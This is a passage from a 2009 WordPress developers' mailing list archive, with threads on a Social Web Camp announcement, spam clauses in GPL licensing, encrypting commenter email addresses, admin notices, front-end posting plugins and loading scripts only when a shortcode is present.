---------- Forwarded message ----------
From: Story Henry
Subject: Social Web Camp
To: Borderie Xavier


Hi Xavier,

?We are organising a Social Web Camp in Santa Clara November 2nd. See below.

---

There will be a Social Web Camp in Sun Offices in Santa Clara on
Monday November 2.

Imagine a world where everybody could participate easily in a
distributed yet secure social web. In such a world people could place
their photos, music, or other content on their web site
and give access to some of it to their friends, some to their family,
the rest to their colleagues, and some even to the friends of their
friends... How can one do this without requiring every participant to
create one login for each of their friends site? How does one do this
in a distributed and flexible manner? What issues would need to be
solved to make this possible?

What existing technologies can we build on? What is missing? What
could the W3C contribute? What could others do? To participate in the
discussion and meet other people with similar interests, and push the
discussion further visit the Santa Clara Social Web Camp wiki and
registration page.

http://barcamp.org/SocialWebCamp-Santa-Clara

When: Monday, 2nd of November 9:00 am to 5:00 pm

Where:
? ? ? ?The Auditorium at Sun's Campus,
? ? ? ?4030 George Sellon Circle
? ? ? ?Santa Clara,
? ? ? ?95054 California



?In particular, ?I will be talking on the solution we have
provisionally called foaf+ssl, which has a wiki here:
http://esw.w3.org/topic/foaf+ssl

This allows one to login to any enabled site without using a
username/password, using only standard technologies available in every
browser. Trust is built using distributed social networks built on the
Friend of a Friend (FOAF) semantic web vocabulary. The protocol is
very simple. Implementations hold in a couple of pages, and we have
open source versions in PHP, Perl, Python and Java

Henry Story

Social Web Architect
Sun Microsystems
Blog: http://blogs.sun.com/bblfish



-- 
Xavier Borderie

From wp-hackers at striderweb.com  Fri Oct 23 13:03:09 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Fri, 23 Oct 2009 08:03:09 -0500
Subject: [wp-hackers] Social Web Camp
In-Reply-To: <9e4ae73e0910230533l7fde4689j5100af410e74e7f6@mail.gmail.com>
References: <7548B7A3-7B43-4D6B-9EE1-6BEA5E12553F@bblfish.net>
	<9e4ae73e0910230533l7fde4689j5100af410e74e7f6@mail.gmail.com>
Message-ID: <78B48D19-97AD-4601-AAA4-01F8B8AAB944@striderweb.com>


On Oct 23, 2009, at 7:33 AM, Xavier Borderie wrote:

> ---------- Forwarded message ----------
> From: Story Henry
> Subject: Social Web Camp
> To: Borderie Xavier
>
> Imagine a world where everybody could participate easily in a
> distributed yet secure social web. In such a world people could place
> their photos, music, or other content on their web site
> and give access to some of it to their friends, some to their family,
> the rest to their colleagues, and some even to the friends of their
> friends...

Isn't that called Facebook?

Stephen

From gaarai at gaarai.com  Fri Oct 23 13:47:18 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 23 Oct 2009 08:47:18 -0500
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <7474be390910230520y25f13ffbxdd6f32d4ed14d099@mail.gmail.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
	<7474be390910230520y25f13ffbxdd6f32d4ed14d099@mail.gmail.com>
Message-ID: <4AE1B3E6.3070706@gaarai.com>

Chuck isn't asking about stopping spam. He's simply asking if there is a
way to release the software while also ensuring that he is insulated
from potential lawsuits if/when spammers start using the code.

Chuck, I'd love to say that you don't have to do anything to cover
yourself, but with the wild way that legal decisions come down these
days, I have to say that there isn't anything you can do to guarantee
insulation from litigation. I would think that the spammer's ISP and/or
hosting company would be targets well before your software would be, so
that's a little bit of insulation there.

I may be misunderstanding though. Are you more concerned about legal
insulation or image protection? Again, I'm not sure if there is anything
solid you can do to protect yourself in either case.

Chris Jean
http://gaarai.com/
@chrisjean



Glenn Ansley wrote:
> I doubt the license will restrict it from being used for spam
> anyway... unless you're planning on taking a lot of people to court
> next year :)
>
> Glenn Ansley
> http://fullthrottledevelopment.com
>
> On Fri, Oct 23, 2009 at 8:00 AM, Chuck Peters <cp at ccil.org> wrote:
>   
>> We have been using a modified version of WP-Digest (1) for our newsletter
>> (2) and due to various issues I am in the process of rewriting the
>> newsletter code from scratch.  I have been thinking about creating a plugin,
>> but the last thing I need is our site getting associated with spamers.
>>
>> I would prefer to use the GPL3, but I need some CYA against those spaming
>> criminals/jerks. Ignoring the issue of how effective a deterrent a software
>> license would be to spamers, can I add restrictions against spaming
>> (including specific damages fees) to one of the GPL compatible licenses?
>>
>> Which license would allow me to make the extra restrictions?
>>
>> I don't think the GPL 2 or 3 would allow me to make these kind of
>> restrictions against spamers.  So if I can't restrict it from being used for
>> spam I am not likely to release it as a plugin.
>>
>>
>> Thanks,
>> Chuck
>>
>> 1. WP-Digest is not really a plugin
>> http://birdhouse.org/software/2006/12/wp-digest/.  It runs via cron and uses
>> php and lynx to format the newsletter and sends out the posts via phpmailer.
>>  If no new posts are found it send out the past 3 posts...
>>
>> 2. We run wordpress and the modified WP-Digest and posts are used to create
>> a newsletter template which we manually edit and send to our site running
>> mailman.  No lynx, phpmailer or cron is used.  We also use procmail, php,
>> sed and bash to create a php page of the current newsletter.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From if.website at gmail.com  Fri Oct 23 13:50:59 2009
From: if.website at gmail.com (Austin Matzko)
Date: Fri, 23 Oct 2009 08:50:59 -0500
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
Message-ID: <674b4a3b0910230650h763a6384m29c5baa30c89dac0@mail.gmail.com>

On Fri, Oct 23, 2009 at 7:00 AM, Chuck Peters <cp at ccil.org> wrote:
> I would prefer to use the GPL3, but I need some CYA against those spaming
> criminals/jerks. Ignoring the issue of how effective a deterrent a software
> license would be to spamers, can I add restrictions against spaming
> (including specific damages fees) to one of the GPL compatible licenses?
>
> Which license would allow me to make the extra restrictions?

I'm not a lawyer, but I don't think you'll find such a license.  A
GPL-compatible license means that "you can combine code released under
the other license with code released under the GNU GPL in one larger
program." [1]  Therefore by definition a GPL-compatible license allows
the user to do whatever he or she wants to do with the code.

Instead, you might consider building in to your mail application
features that make spamming difficult or that require compliance with
anti-spam legislation, such as the CAN-SPAM act. [2]  For example, you
could throttle the amount of email that can be sent and you could
force users to follow CAN-SPAM requirements such as opt-out features
and a physical address.

[1] http://www.gnu.org/licenses/gpl-faq.html#WhatDoesCompatMean
[2] http://www.ftc.gov/bcp/edu/pubs/business/ecommerce/bus61.shtm

From otto at ottodestruct.com  Fri Oct 23 14:35:41 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 23 Oct 2009 09:35:41 -0500
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
Message-ID: <161617690910230735v7bccc93ahdefea99eca67221b@mail.gmail.com>

On Fri, Oct 23, 2009 at 7:00 AM, Chuck Peters <cp at ccil.org> wrote:
> I would prefer to use the GPL3, but I need some CYA against those spaming
> criminals/jerks. Ignoring the issue of how effective a deterrent a software
> license would be to spamers, can I add restrictions against spaming
> (including specific damages fees) to one of the GPL compatible licenses?
>
> Which license would allow me to make the extra restrictions?
>
> I don't think the GPL 2 or 3 would allow me to make these kind of
> restrictions against spamers.  So if I can't restrict it from being used for
> spam I am not likely to release it as a plugin.

A few points:

- WordPress is licensed under the GPLv2. The GPLv3 is not compatible,
because of the additional restrictions it imposes. There's no code or
documentation I'm aware of that allows you to up-version with
WordPress and the license, so AFAICT, the GPLv3 is not an acceptable
license for WordPress plugins and/or themes.

- If you use GPL-anything, you cannot impose additional restrictions
of any kind.

- Any license that does impose additional restrictions, like a no-spam
clause, is incompatible with the GPL, and couldn't be included in the
WordPress extend section.

-Otto
Sent from Memphis, TN, United States

From yahgrp at poplarware.com  Fri Oct 23 15:36:35 2009
From: yahgrp at poplarware.com (Jennifer Hodgdon)
Date: Fri, 23 Oct 2009 08:36:35 -0700
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <161617690910230735v7bccc93ahdefea99eca67221b@mail.gmail.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com>
	<161617690910230735v7bccc93ahdefea99eca67221b@mail.gmail.com>
Message-ID: <4AE1CD83.8060802@poplarware.com>

Otto wrote:
> - WordPress is licensed under the GPLv2. The GPLv3 is not compatible,
> because of the additional restrictions it imposes. There's no code or
> documentation I'm aware of that allows you to up-version with
> WordPress and the license, so AFAICT, the GPLv3 is not an acceptable
> license for WordPress plugins and/or themes.

I think you are wrong there. The readme.html file in the WordPress 
distro says:

"WordPress is released under the GPL (see license.txt)."

license.txt says:

"If the Program does not specify a version number of this License, you 
may choose any version ever published by the Free Software Foundation."

WordPress does not specify a version number (except I do see a GPL v2 
reference in xmlrpc.php, and there are specific licenses on some 
individual 3rd-party files that are included in WordPress), as far as 
I can see.

So you may choose any version of the GPL, by my reading. I'm not an 
attorney...

   --Jennifer

-- 
Jennifer Hodgdon * Poplar ProductivityWare
www.poplarware.com
Drupal, WordPress, and custom Web programming


From otto at ottodestruct.com  Fri Oct 23 15:47:07 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 23 Oct 2009 10:47:07 -0500
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <4AE1CD83.8060802@poplarware.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com> 
	<161617690910230735v7bccc93ahdefea99eca67221b@mail.gmail.com> 
	<4AE1CD83.8060802@poplarware.com>
Message-ID: <161617690910230847g4f55f687ied1f354ba787dd31@mail.gmail.com>

Ahh, true that. Fair enough, I was looking for the "or any later
version" boilerplate in the readme and didn't find it, so I assumed
that the license.txt was the only allowable version.

Nevertheless, I would avoid using GPLv3, because it *is* incompatible
with GPLv2 software, and many people will not use it because of the
excessive restrictions it imposes on usage (not just distribution,
like the GPLv2).

-Otto



On Fri, Oct 23, 2009 at 10:36 AM, Jennifer Hodgdon
<yahgrp at poplarware.com> wrote:
> Otto wrote:
>>
>> - WordPress is licensed under the GPLv2. The GPLv3 is not compatible,
>> because of the additional restrictions it imposes. There's no code or
>> documentation I'm aware of that allows you to up-version with
>> WordPress and the license, so AFAICT, the GPLv3 is not an acceptable
>> license for WordPress plugins and/or themes.
>
> I think you are wrong there. The readme.html file in the WordPress distro
> says:
>
> "WordPress is released under the GPL (see license.txt)."
>
> license.txt says:
>
> "If the Program does not specify a version number of this License, you may
> choose any version ever published by the Free Software Foundation."
>
> WordPress does not specify a version number (except I do see a GPL v2
> reference in xmlrpc.php, and there are specific licenses on some individual
> 3rd-party files that are included in WordPress), as far as I can see.
>
> So you may choose any version of the GPL, by my reading. I'm not an
> attorney...
>
> ?--Jennifer
>
> --
> Jennifer Hodgdon * Poplar ProductivityWare
> www.poplarware.com
> Drupal, WordPress, and custom Web programming
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jwriteclub at gmail.com  Fri Oct 23 15:51:33 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Fri, 23 Oct 2009 08:51:33 -0700
Subject: [wp-hackers] Plugin License Excluding Spam
In-Reply-To: <4AE1CD83.8060802@poplarware.com>
References: <cfd69f2e0910230500k1a36442evd6bb6c89209fb115@mail.gmail.com> 
	<161617690910230735v7bccc93ahdefea99eca67221b@mail.gmail.com> 
	<4AE1CD83.8060802@poplarware.com>
Message-ID: <81d01c0910230851r58ef8040gaca1118a31079b22@mail.gmail.com>

I must confess, I don't really see what the problem is. Unless your software
has features specifically designed to make spamming easier, and you
advertise it that way, I don't see how you could be held liable for spam
that other people use your software to send. For instance, I don't think
that postfix or sendmail could be sued if someone used them for spam.

Furthermore, this is, in some ways, more appropriate for the warranty
section or a note. For instance after I got several emails for my uAudio
plugin asking (essentially) how to hotlink to audio on other's domains, I
made a little note at the end of my license file indicating that it was only
to be used to lawful purposes and that the user needed to obtain the
permission of the creator before posting any audio files. A little CYA, but
hopefully enough.

~ Christopher

I'm not a lawyer, and this isn't legal advice, results may vary, refrigerate
after opening, don't consume while driving, . . .

On Fri, Oct 23, 2009 at 8:36 AM, Jennifer Hodgdon <yahgrp at poplarware.com>wrote:

> Otto wrote:
>
>> - WordPress is licensed under the GPLv2. The GPLv3 is not compatible,
>> because of the additional restrictions it imposes. There's no code or
>> documentation I'm aware of that allows you to up-version with
>> WordPress and the license, so AFAICT, the GPLv3 is not an acceptable
>> license for WordPress plugins and/or themes.
>>
>
> I think you are wrong there. The readme.html file in the WordPress distro
> says:
>
> "WordPress is released under the GPL (see license.txt)."
>
> license.txt says:
>
> "If the Program does not specify a version number of this License, you may
> choose any version ever published by the Free Software Foundation."
>
> WordPress does not specify a version number (except I do see a GPL v2
> reference in xmlrpc.php, and there are specific licenses on some individual
> 3rd-party files that are included in WordPress), as far as I can see.
>
> So you may choose any version of the GPL, by my reading. I'm not an
> attorney...
>
>  --Jennifer
>
> --
> Jennifer Hodgdon * Poplar ProductivityWare
> www.poplarware.com
> Drupal, WordPress, and custom Web programming
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Fri Oct 23 17:20:53 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 23 Oct 2009 13:20:53 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email and user_email
Message-ID: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>

Hello,

Has anyone heard of anyone writing a plugin that encrypts these three
columns in the database level?

a. $comment->comment_author_email, "SELECT comment_author_email FROM
wp_comments" and "SELECT user_email FROM wp_users" will display
gibberish.

b. comment_author_email() will display gibberish unless a condition
set in the plugin is true.

I would like assurance that someone who gains db access to the blog or
get hold of a SQL dump cannot harvest email addresses.

Also, if this is something one shouldn't worry about, why not?

Thank you for your assistance.

W

From tim at feyreal.com  Fri Oct 23 17:32:16 2009
From: tim at feyreal.com (Tim Moore)
Date: Fri, 23 Oct 2009 13:32:16 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email 	and user_email
In-Reply-To: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
Message-ID: <6ab20b230910231032t50a0e21aj4a9e76c7d7f1c1cf@mail.gmail.com>

Most encryption to a database is a one way street. Once the email addresses
are encrypted, you can't get them back in any useful way. Which makes
collecting the email addresses pointless.

In my experience, anyone breaking into a database is there not to gain a
list of email addresses to spam, but to gain usernames and passwords.
They're on a whole other level than email harvesters.

<tim>

On Fri, Oct 23, 2009 at 1:20 PM, William Canino <
william.canino at googlemail.com> wrote:

> Hello,
>
> Has anyone heard of anyone writing a plugin that encrypts these three
> columns in the database level?
>
> a. $comment->comment_author_email, "SELECT comment_author_email FROM
> wp_comments" and "SELECT user_email FROM wp_users" will display
> gibberish.
>
> b. comment_author_email() will display gibberish unless a condition
> set in the plugin is true.
>
> I would like assurance that someone who gains db access to the blog or
> get hold of a SQL dump cannot harvest email addresses.
>
> Also, if this is something one shouldn't worry about, why not?
>
> Thank you for your assistance.
>
> W
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From matt at sivel.net  Fri Oct 23 17:36:37 2009
From: matt at sivel.net (Matt Martz)
Date: Fri, 23 Oct 2009 13:36:37 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email and user_email
In-Reply-To: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
Message-ID: <20091023173637.GA1731@worf.noc.sivel.net>

On Fri, Oct 23, 2009 at 01:20:53PM -0400, William Canino wrote:
> Also, if this is something one shouldn't worry about, why not?

One of the first things that comes to mind is issues with getting
avatars from gravatar.  As long as you can hash the email with md5,
don't care about ever seeing the email address again and write a new
get_avatar function (you can do that since get_avatar is in
pluggable.php) to not try and md5 the email address you would be ok.

This may not be the only problem.  Just one of the first that popped
into my head.

-- 
Matt Martz
matt at sivel.net
http://sivel.net/

From otto at ottodestruct.com  Fri Oct 23 19:15:36 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 23 Oct 2009 14:15:36 -0500
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email 	and user_email
In-Reply-To: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
Message-ID: <161617690910231215x7a80d9ebu1421caa0ff779c02@mail.gmail.com>

On Fri, Oct 23, 2009 at 12:20 PM, William Canino
<william.canino at googlemail.com> wrote:
> I would like assurance that someone who gains db access to the blog or
> get hold of a SQL dump cannot harvest email addresses.
>
> Also, if this is something one shouldn't worry about, why not?

If somebody gets DB access, then you're pwned already. They can do
much worse things than simply harvest email addresses. Your site is
basically under their control at that point.

-Otto

From william.canino at googlemail.com  Fri Oct 23 20:31:29 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 23 Oct 2009 16:31:29 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
	comment_author_email and user_email
In-Reply-To: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
Message-ID: <e4dc67e0910231331h181b42afref1409b7238bbebb@mail.gmail.com>

True but I can restore the site from backups. But once the emails are
harvested, I cannot do anything about it.

My blog's theme says, "Your email is <i>never</i> published or
shared". This is why I want to do one step further.

Can the plugin basically hook pre_comment_author_email (encrypt it)
and hook get_comment_author_email, author_email and comment_email
(decrypt it if conditions are met)?

and the same with pre_comment_user_ip and get_comment_author_IP?

For user_email, it seems I have to override get_userdatabylogin() to decrypt it.

Matt mentioned get_avatar(). What else should I watch out for?

W

2009/10/23 William Canino <william.canino at googlemail.com>:
> Hello,
>
> Has anyone heard of anyone writing a plugin that encrypts these three
> columns in the database level?
>
> a. $comment->comment_author_email, "SELECT comment_author_email FROM
> wp_comments" and "SELECT user_email FROM wp_users" will display
> gibberish.
>
> b. comment_author_email() will display gibberish unless a condition
> set in the plugin is true.
>
> I would like assurance that someone who gains db access to the blog or
> get hold of a SQL dump cannot harvest email addresses.
>
> Also, if this is something one shouldn't worry about, why not?
>
> Thank you for your assistance.
>
> W
>

From gaarai at gaarai.com  Fri Oct 23 20:40:45 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 23 Oct 2009 15:40:45 -0500
Subject: [wp-hackers] Encrypting comment_author_IP,
 comment_author_email and user_email
In-Reply-To: <e4dc67e0910231331h181b42afref1409b7238bbebb@mail.gmail.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>
	<e4dc67e0910231331h181b42afref1409b7238bbebb@mail.gmail.com>
Message-ID: <4AE214CD.3010107@gaarai.com>

If you encrypt it in a way that can be reversed out, then the person who
gets ahold of the data can still reconstruct it.

Even if a certain one-way hashes are used, which more or less destroys
any value of having it in the first place, rainbow tables can be used to
reconstruct the data quickly and simply.

It is impossible to guarantee anything, especially security. So, it
sounds like the problem is your promise, not the technology.

Technically, if the data was stolen, it was neither published nor
shared, so you haven't violated your promise.

If this is truly a big concern for you, simply filter the email address
into a dummy address before it gets stored so even you don't have access
to it.

Chris Jean
http://gaarai.com/
@chrisjean



William Canino wrote:
> True but I can restore the site from backups. But once the emails are
> harvested, I cannot do anything about it.
>
> My blog's theme says, "Your email is <i>never</i> published or
> shared". This is why I want to do one step further.
>
> Can the plugin basically hook pre_comment_author_email (encrypt it)
> and hook get_comment_author_email, author_email and comment_email
> (decrypt it if conditions are met)?
>
> and the same with pre_comment_user_ip and get_comment_author_IP?
>
> For user_email, it seems I have to override get_userdatabylogin() to decrypt it.
>
> Matt mentioned get_avatar(). What else should I watch out for?
>
> W

From photofantaisie at gmail.com  Fri Oct 23 21:34:17 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Fri, 23 Oct 2009 23:34:17 +0200
Subject: [wp-hackers] register_settings and admin_notices
In-Reply-To: <7474be390910230532p324a5a66wfb1a3e6bc1f800e1@mail.gmail.com>
References: <9dd057850910230237k148aae76i7fa261e25f214c1b@mail.gmail.com>
	<eaaa36c90910230527y6be42ba0r878d1c35a3b2847d@mail.gmail.com>
	<7474be390910230532p324a5a66wfb1a3e6bc1f800e1@mail.gmail.com>
Message-ID: <9dd057850910231434qe80f8f8y92086236394bef45@mail.gmail.com>

@ Mohammad and Glenn,

Thanks for the feedback guys. Your comments gave me some ideas which led to
the following solution:

A conditional inside the register_settings() callback function checks if the
Settings page Reset checkbox has been checked. If true, it adds a new option
to the options array, called 'just-reset' with a value of 'true'. Then in
the admin_notices function, if 'just-reset' is true, the function outputs
the customised message. If the Settings page is updated without Reset,
'just-reset' is set to 'false', and no custom message is displayed. The
admin_notices function also checks the plugin's pagehook before doing
anything (good point, Glenn).

Plus, I can use the same method to add other validation messages, if
required, all hooked into admin_notices.

This works well, functionality-wise. I guess the only downside is the db
write and retrieval of the 'just-reset' option, but I don't think this is
really an issue given it's only happening in admin.

If anyone can see a better way, the feedback will be very welcome.

Thanks!

Ade.





2009/10/23 Glenn Ansley <glenn at glennansley.com>

> I haven't looked at the code to see if there's an API for that but
> rather than using javascript you could hook in before that chunk of
> code and unset $_GET['updated']. Then you could use the admin_notices
> to construct your own message. (Check to make sure it's your plugin's
> page before unsetting it though).
>
> Glenn Ansley
> http://fullthrottledevelopment.com
> http://twitter.com/full_throttle
> http://twitter.com/glennansley
>
> On Fri, Oct 23, 2009 at 8:27 AM, Mohammad Jangda <batmoo at gmail.com> wrote:
> > Here's the code that displays the "updated" message (in
> options-head.php):
> >
> > <?php if (isset($_GET['updated'])) : ?>
> >> <div id="message" class="updated fade"><p><strong><?php _e('Settings
> >> saved.') ?></strong></p></div>
> >> <?php endif; ?>
> >>
> >
> > I don't see an easy way to change that.
> >
> > You could use admin_notices to display the custom message and use
> javascript
> > to hide the default "Settings Saved" message (obviously a subpar
> solution).
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From sharon at BrewerRadio.com  Fri Oct 23 21:43:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Fri, 23 Oct 2009 17:43:00 -0400
Subject: [wp-hackers] Plugin or Advice for Front-End Dashboard
Message-ID: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>

I?ve got a wordpress site that I?m using mainly as a local event site, using an event plugin that I?ve written that integrates to the add post page.
 
What I?d like to do is add a button to the home page that would allow the general public (once logged in, of course) to add a post?only I don?t want to display the dashboard.
 
What I would like instead is to have a themed page where I could filter the add post page to display exactly what I want, including ?Add Event? instead of ?Add New Post?.  All of the ?general public? would be contributors, so I could easily display the stuff based on the user role.
 
What I?m curious about is whether anyone knows of a plugin that already does something similar, or if you have any advice on starting from scratch.  I did search the plugins directly on Wordpress, and came up nil.
 
Many thanks, 
Sharon Chambers
Webmaster
brewer media
 

From gaarai at gaarai.com  Fri Oct 23 21:45:25 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Fri, 23 Oct 2009 16:45:25 -0500
Subject: [wp-hackers] Plugin or Advice for Front-End Dashboard
In-Reply-To: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>
References: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>
Message-ID: <4AE223F5.9060707@gaarai.com>

You'll want to check out the P2 Theme
<http://wordpress.org/extend/themes/p2>. It allows for posting from the
front-end of the site. No back-end customizations necessary.

Chris Jean
http://gaarai.com/
@chrisjean



Sharon Chambers wrote:
> I?ve got a wordpress site that I?m using mainly as a local event site, using an event plugin that I?ve written that integrates to the add post page.
>  
> What I?d like to do is add a button to the home page that would allow the general public (once logged in, of course) to add a post?only I don?t want to display the dashboard.
>  
> What I would like instead is to have a themed page where I could filter the add post page to display exactly what I want, including ?Add Event? instead of ?Add New Post?.  All of the ?general public? would be contributors, so I could easily display the stuff based on the user role.
>  
> What I?m curious about is whether anyone knows of a plugin that already does something similar, or if you have any advice on starting from scratch.  I did search the plugins directly on Wordpress, and came up nil.
>  
> Many thanks, 
> Sharon Chambers
> Webmaster
> brewer media
>  
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From CaptainN at unFocus.com  Fri Oct 23 21:57:30 2009
From: CaptainN at unFocus.com (Kevin Newman)
Date: Fri, 23 Oct 2009 17:57:30 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is output?
Message-ID: <4AE226CA.1050002@unFocus.com>

Hello,

Is there anyway to check if there your registered shortcode (for a 
plugin) is being used in the current post, during some action hook 
before the header is output? The idea would be to include CSS and JS 
files for the shortcode, only on pages that actually use the shortcode. 
I'm doing it inline right now, since wp_enqueue_script is not available 
where the shortcode is dealt with.

Thanks,

Kevin N.


From esmi at quirm.net  Fri Oct 23 22:12:28 2009
From: esmi at quirm.net (esmi at quirm dot net)
Date: Fri, 23 Oct 2009 23:12:28 +0100
Subject: [wp-hackers] Plugin or Advice for Front-End Dashboard
In-Reply-To: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>
References: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>
Message-ID: <4AE22A4C.205@quirm.net>

on 23/10/2009 22:43 Sharon Chambers said the following:
<snip>
> What I would like instead is to have a themed page where I could
> filter the add post page to display exactly what I want, including
> ?Add Event? instead of ?Add New Post?.  All of the ?general public?
> would be contributors, so I could easily display the stuff based on
> the user role.
> 
> What I?m curious about is whether anyone knows of a plugin that
> already does something similar, or if you have any advice on starting
> from scratch.  I did search the plugins directly on Wordpress, and
> came up nil.

What about:

<http://wordpress.org/extend/plugins/tdo-mini-forms/>

-- 
esmi




From steph at sillybean.net  Fri Oct 23 22:36:50 2009
From: steph at sillybean.net (Stephanie Leary)
Date: Fri, 23 Oct 2009 17:36:50 -0500
Subject: [wp-hackers] Plugin or Advice for Front-End Dashboard
In-Reply-To: <4AE22A4C.205@quirm.net>
References: <d94b9d78.1ca5429.555ac4.29@BrewerRadio.com>
	<4AE22A4C.205@quirm.net>
Message-ID: <579663E8-468D-4F20-8942-8F7625545519@sillybean.net>


On Oct 23, 2009, at 5:12 PM, esmi at quirm dot net <esmi at quirm.net>  
wrote:

> on 23/10/2009 22:43 Sharon Chambers said the following:
> <snip>
> What about:
>
> <http://wordpress.org/extend/plugins/tdo-mini-forms/>

I believe Gravity Forms (commercial) and CForms II will do this as  
well. There's also the Posthaste plugin, which emulates the P2 theme's  
functionality.

Stephanie Leary

From scribu at gmail.com  Fri Oct 23 23:02:08 2009
From: scribu at gmail.com (scribu)
Date: Sat, 24 Oct 2009 02:02:08 +0300
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE226CA.1050002@unFocus.com>
References: <4AE226CA.1050002@unFocus.com>
Message-ID: <349fe48b0910231602n65464a73yd8f95c4f9a2d7b74@mail.gmail.com>

Try this:

add_action('template_redirect', 'add_scripts');

function add_scripts() {
if ( ! is_page() )
return;

global $posts;

if ( FALSE === strpos($posts[0]->post_content, '[your_shortcode') )
return;

wp_enqueue_script(...
}


-- 
http://scribu.net

From william.canino at googlemail.com  Fri Oct 23 23:07:35 2009
From: william.canino at googlemail.com (William Canino)
Date: Fri, 23 Oct 2009 19:07:35 -0400
Subject: [wp-hackers] checking if post has shortcode,
	before header is 	output?
In-Reply-To: <4AE226CA.1050002@unFocus.com>
References: <4AE226CA.1050002@unFocus.com>
Message-ID: <e4dc67e0910231607y7cc59b6bs8384c37e966c9f15@mail.gmail.com>

This is not an answer but a praise to you for thinking this way.

Too many plugins require_once and wp_enqueue_script their entire
machinery at init or at wp_head without first checking whether the
page actually needs them.



2009/10/23 Kevin Newman <CaptainN at unfocus.com>:
> Hello,
>
> Is there anyway to check if there your registered shortcode (for a plugin)
> is being used in the current post, during some action hook before the header
> is output? The idea would be to include CSS and JS files for the shortcode,
> only on pages that actually use the shortcode. I'm doing it inline right
> now, since wp_enqueue_script is not available where the shortcode is dealt
> with.
>
> Thanks,
>
> Kevin N.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dougal at gunters.org  Fri Oct 23 23:35:12 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 23 Oct 2009 19:35:12 -0400
Subject: [wp-hackers] Encrypting comment_author_IP,
 comment_author_email and user_email
In-Reply-To: <4AE214CD.3010107@gaarai.com>
References: <e4dc67e0910231020g2357f60cq5dd7b965c7672804@mail.gmail.com>	<e4dc67e0910231331h181b42afref1409b7238bbebb@mail.gmail.com>
	<4AE214CD.3010107@gaarai.com>
Message-ID: <4AE23DB0.90306@gunters.org>

On Oct 23 2009 4:40 PM, Chris Jean wrote:
> Technically, if the data was stolen, it was neither published nor
> shared, so you haven't violated your promise.

That's just a cop-out.

Keep in mind that there can be very good reasons for not wanting to 
store that data in a format that can be recovered. For example, if you 
live in an oppressive country where "Freedom of Speech" is not observed 
(and expressing opinions contrary to the government's can get you 
arrested, tortured, and killed -- this is not just a theoretical 
